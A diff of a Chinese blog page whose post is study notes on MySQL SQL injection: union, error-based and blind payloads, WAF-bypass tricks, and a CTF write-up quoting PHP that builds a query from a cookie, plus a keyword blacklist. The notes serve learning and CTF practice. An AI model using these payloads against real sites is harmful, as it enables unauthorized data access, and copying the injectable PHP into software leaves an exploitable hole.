@@ -1,744 +1,259 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next mist use-motion" lang>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
 
 
 <meta http-equiv="Cache-Control" content="no-transform">
 <meta http-equiv="Cache-Control" content="no-siteapp">
 
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
+<meta name="description" content="sql注入学习"><meta name="keywords" content="sql, ll"><link rel="alternate" href="/default" title="ll"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
+<link rel="canonical" href="http://yoursite.com/2019/03/04/sql注入学习/">
 
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">
 
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
-    
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-    
-    <link href="https://fonts.googleapis.com/css?family=Muli:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="sql,">
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="前段时间因为spacevim的各种问题，把mac重装了，最后选择不用现成的配置，现在使用neovim，并用vim-plug管理插件。整个博客也重新撘了一遍，最后决定就留下这一篇基础的sql注入总结的文章: )。 基础information_schema数据库：schemata表   存储用户创建的所有数据库的库名，记录数据库库名的字段名为SCHEMA_NAME。tables表  存储用户创建的所有">
-<meta name="keywords" content="sql">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql注入学习">
-<meta property="og:url" content="http://yoursite.com/2019/03/04/sql注入学习/index.html">
-<meta property="og:site_name" content="ll">
-<meta property="og:description" content="前段时间因为spacevim的各种问题，把mac重装了，最后选择不用现成的配置，现在使用neovim，并用vim-plug管理插件。整个博客也重新撘了一遍，最后决定就留下这一篇基础的sql注入总结的文章: )。 基础information_schema数据库：schemata表   存储用户创建的所有数据库的库名，记录数据库库名的字段名为SCHEMA_NAME。tables表  存储用户创建的所有">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-13T14:57:17.062Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql注入学习">
-<meta name="twitter:description" content="前段时间因为spacevim的各种问题，把mac重装了，最后选择不用现成的配置，现在使用neovim，并用vim-plug管理插件。整个博客也重新撘了一遍，最后决定就留下这一篇基础的sql注入总结的文章: )。 基础information_schema数据库：schemata表   存储用户创建的所有数据库的库名，记录数据库库名的字段名为SCHEMA_NAME。tables表  存储用户创建的所有">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
     }
-  };
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
 </script>
 
+    <title>sql注入学习 - ll</title>
+  </head>
 
-
-  <link rel="canonical" href="http://yoursite.com/2019/03/04/sql注入学习/">
-
-
-
-
-
-  <title>sql注入学习 | ll</title>
-  
-
-
-
-
-
-
-
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="default">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">ll</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">ll</a>
   </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
   </div>
 </div>
 
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/links/">
+        <li class="mobile-menu-item">Links
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
 </nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">ll</a>
+</div>
 
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/links/">
+            Links
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
 
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">sql注入学习
+        </h1>
 
- </div>
+      <div class="post-meta">
+        <span class="post-time">
+          2019-03-04
+        </span></div>
     </header>
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/04/sql注入学习/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ll">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ll">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">sql注入学习</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-04T20:02:24+08:00">
-                2019-03-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p>前段时间因为spacevim的各种问题，把mac重装了，最后选择不用现成的配置，现在使用neovim，并用vim-plug管理插件。<br>整个博客也重新撘了一遍，最后决定就留下这一篇基础的sql注入总结的文章: )。</p>
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#基础"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#union注入"><span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bool注入"><span class="toc-text">bool注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#一些绕过技巧"><span class="toc-text">一些绕过技巧</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#最近学习"><span class="toc-text">最近学习</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><p>前段时间因为spacevim的各种问题，把mac重装了，最后选择不用现成的配置，现在使用neovim，并用vim-plug管理插件。<br>整个博客也重新撘了一遍，最后决定就留下这一篇基础的sql注入总结的文章: )。</p>
 <h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>information_schema数据库：<br>schemata表   存储用户创建的所有数据库的库名，记录数据库库名的字段名为SCHEMA_NAME。<br>tables表  存储用户创建的所有数据库的库名和表名，字段名分别为TABLE_SCHEMA、TABLE_NAME。<br>columns表  存储用户创建的所有数据库的库名、表名和字段名，字段名分别为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</p>
 <p>mysql5.5及以上版本开始，默认引擎为innodb。<br>mysql5.6及以上版本中，mysql库中有两个新表innodb_index_stats和innodb_table_stats。里面存放了新创建的数据库库名和表名，对应字段名分别为database_name和table_name。</p>
 <p>database() 当前网站使用的数据库<br>version() 当前mysql的版本<br>user() 当前mysql的用户</p>
 <p>注释<br>#<br>--空格<br>/**/</p>
 <p>内联注释<br>/!**/</p>
 <p>mysql字符串函数参考：<a href="https://www.jb51.net/article/87120.htm" target="_blank" rel="noopener">https://www.jb51.net/article/87120.htm</a></p>
-<p>数字型注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id =1</span><br></pre></td></tr></table></figure></p>
-<p>字符型注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id =&apos;1&apos;;</span><br><span class="line">select * from table_name where id =(&apos;1&apos;);</span><br><span class="line">select * from table_name where id =&quot;1&quot;;</span><br><span class="line">select * from table_name where id =(&quot;1&quot;);</span><br></pre></td></tr></table></figure></p>
-<h5 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h5><p>判断字段数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 2 #</span><br></pre></td></tr></table></figure></p>
-<p>看回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2 #</span><br></pre></td></tr></table></figure></p>
-<p>如果回显第二位，则  :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); #</span><br></pre></td></tr></table></figure></p>
-<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>基础语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(),0x7e),1) </span><br><span class="line">and extractvalue(1, concat(0x7e,(),0x7e) )</span><br><span class="line">and (select 1 from (select count(*),concat((),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
-<h5 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h5><p>基础语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and length(database()) =4; #</span><br><span class="line">1&apos; and ord(substr(database(),1,1)) = 119; #     w</span><br><span class="line">1&apos; and ascii(substr(database(),2,1)) = 101; #   e</span><br><span class="line">1&apos; and substr(database(),3,1) = &apos;b&apos; #;          b</span><br></pre></td></tr></table></figure></p>
-<p>猜测表的个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) = 2; #</span><br></pre></td></tr></table></figure></p>
-<p>猜表名<br>第一个表表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 4; #</span><br><span class="line">1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 102; # f</span><br></pre></td></tr></table></figure></p>
-<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>基础语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if((),sleep(5),1)</span><br><span class="line">if((),benchmark(10000000,md5(1)),1)</span><br><span class="line">substr((),&#123;&#125;,1)=&apos;&#123;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>数字型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id =1</span><br></pre></td></tr></table></figure>
+
+<p>字符型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id =&apos;1&apos;;</span><br><span class="line">select * from table_name where id =(&apos;1&apos;);</span><br><span class="line">select * from table_name where id =&quot;1&quot;;</span><br><span class="line">select * from table_name where id =(&quot;1&quot;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h5><p>判断字段数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 2 #</span><br></pre></td></tr></table></figure>
+
+<p>看回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2 #</span><br></pre></td></tr></table></figure>
+
+<p>如果回显第二位，则  :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); #</span><br></pre></td></tr></table></figure>
+
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>基础语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(),0x7e),1) </span><br><span class="line">and extractvalue(1, concat(0x7e,(),0x7e) )</span><br><span class="line">and (select 1 from (select count(*),concat((),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<h5 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h5><p>基础语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and length(database()) =4; #</span><br><span class="line">1&apos; and ord(substr(database(),1,1)) = 119; #     w</span><br><span class="line">1&apos; and ascii(substr(database(),2,1)) = 101; #   e</span><br><span class="line">1&apos; and substr(database(),3,1) = &apos;b&apos; #;          b</span><br></pre></td></tr></table></figure>
+
+<p>猜测表的个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) = 2; #</span><br></pre></td></tr></table></figure>
+
+<p>猜表名<br>第一个表表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 4; #</span><br><span class="line">1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 102; # f</span><br></pre></td></tr></table></figure>
+
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>基础语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if((),sleep(5),1)</span><br><span class="line">if((),benchmark(10000000,md5(1)),1)</span><br><span class="line">substr((),&#123;&#125;,1)=&apos;&#123;&#125;&apos;</span><br></pre></td></tr></table></figure>
+
 <h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>二次注入、insert into注入……</p>
 <h5 id="一些绕过技巧"><a href="#一些绕过技巧" class="headerlink" title="一些绕过技巧"></a>一些绕过技巧</h5><p>双写绕过<br>sselectelect<br>大小写绕过<br>Select<br>注释绕过<br>se/**/lect<br>内联注释<br>/!**/</p>
 <p>url中的注释<br>#用%23<br>–+<br>–%20</p>
-<p>=被过滤，用like或者regexp绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 1;</span><br><span class="line">select * from table_name where id like 1;</span><br><span class="line">select * from table_name where id regexp 1; // 还会匹配到1.*</span><br></pre></td></tr></table></figure></p>
-<p>逗号被过滤<br>时间盲注if(exp1,exp2,exp3) 不能用<br>类似if的用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when (exp1) then (exp2) else (exp3) end</span><br></pre></td></tr></table></figure></p>
-<p>substr((),1,1)=’{}’和substring不能用<br>可用from 1 for 1代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(() from &#123;&#125; for 1)=&apos;&#123;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>limit 0,1不能用<br>可用1 offset 0代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name limit 1 offset 0;</span><br></pre></td></tr></table></figure></p>
-<p>select * from table_name union select 1,2,3; #不能用<br>可结合join语句和子查询的别名来代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name union select * from ((select 1)a join (select 2)b join (select 3)c);</span><br></pre></td></tr></table></figure></p>
+<p>=被过滤，用like或者regexp绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 1;</span><br><span class="line">select * from table_name where id like 1;</span><br><span class="line">select * from table_name where id regexp 1; // 还会匹配到1.*</span><br></pre></td></tr></table></figure>
+
+<p>逗号被过滤<br>时间盲注if(exp1,exp2,exp3) 不能用<br>类似if的用法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when (exp1) then (exp2) else (exp3) end</span><br></pre></td></tr></table></figure>
+
+<p>substr((),1,1)=’{}’和substring不能用<br>可用from 1 for 1代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(() from &#123;&#125; for 1)=&apos;&#123;&#125;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>limit 0,1不能用<br>可用1 offset 0代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name limit 1 offset 0;</span><br></pre></td></tr></table></figure>
+
+<p>select * from table_name union select 1,2,3; #不能用<br>可结合join语句和子查询的别名来代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name union select * from ((select 1)a join (select 2)b join (select 3)c);</span><br></pre></td></tr></table></figure>
+
 <p>空格被过滤<br>/**/<br>0x0a<br>0x0b<br>0x0c<br>0x0d<br>``反引号<br>()括号</p>
-<p>‘单引号被过滤<br>hex绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 0x...;</span><br></pre></td></tr></table></figure></p>
-<p>char()绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where name = char(76,76);</span><br></pre></td></tr></table></figure></p>
-<p>宽字节绕过<br>如果’单引号前加上\反斜杠被转义。当数据库编码gbk时，反斜杠%5c加上%df为繁体字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// $id = 1%df&apos;#</span><br><span class="line">select * from table_name where id = &apos;1%df&apos;#&apos;;</span><br></pre></td></tr></table></figure></p>
-<p>&lt;&gt;被过滤<br>盲注中可能用到&lt;&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 1 and ascii(substr(database(),2,1)) &gt; 101; #</span><br></pre></td></tr></table></figure></p>
-<p>用greatest()、least()绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 1 and greatest(ascii(substr(database(),2,1)),101)=101; // greatest()返回最大值</span><br><span class="line">select * from table_name where id = 1 and least(ascii(substr(database(),2,1)),101)=101; // least()返回最小值</span><br></pre></td></tr></table></figure></p>
-<h5 id="最近学习"><a href="#最近学习" class="headerlink" title="最近学习"></a>最近学习</h5><p>最近看官方hctf2018 wp学习了一下，这里记录下。<br>里面有道本义是bool盲注的题，结果可利用json反序列化unicode绕过waf的漏洞。<br>php审计一下，发现漏洞点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">'username'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>通过爆破发现$login_data[‘admin_pass’]=65时可以成功登陆。<br>所以可利用bool注入，通过登陆状态来判断语句是否正确。<br>审计时发现对$_GET、$_POST、$_COOKIE进行了过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|and|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br></pre></td></tr></table></figure></p>
-<p>因为过滤了or所以不能用information_schema库来查询，可用innodb_table_stats和innodb_index_stats这两张表来查询表名。<br>脚本参考官方wp:<a href="https://bysec.io/hctf/writeup.html" target="_blank" rel="noopener">https://bysec.io/hctf/writeup.html</a><br>但是这题可利用json_decode()解码unicode的特性实现时间盲注。<br>只要把被过滤的关键字部分字母替换成unicode编码即可。如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'u'</span>)))[<span class="number">2</span>:]+<span class="string">'nion'</span> <span class="comment"># \u0075nion</span></span><br></pre></td></tr></table></figure></p>
+<p>‘单引号被过滤<br>hex绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 0x...;</span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-    
-    
-    
+<p>char()绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where name = char(76,76);</span><br></pre></td></tr></table></figure>
 
-    
+<p>宽字节绕过<br>如果’单引号前加上\反斜杠被转义。当数据库编码gbk时，反斜杠%5c加上%df为繁体字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// $id = 1%df&apos;#</span><br><span class="line">select * from table_name where id = &apos;1%df&apos;#&apos;;</span><br></pre></td></tr></table></figure>
 
-    
+<p>&lt;&gt;被过滤<br>盲注中可能用到&lt;&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id = 1 and ascii(substr(database(),2,1)) &gt; 101; #</span><br></pre></td></tr></table></figure>
 
-    
+<p>用greatest()、least()绕过</p>
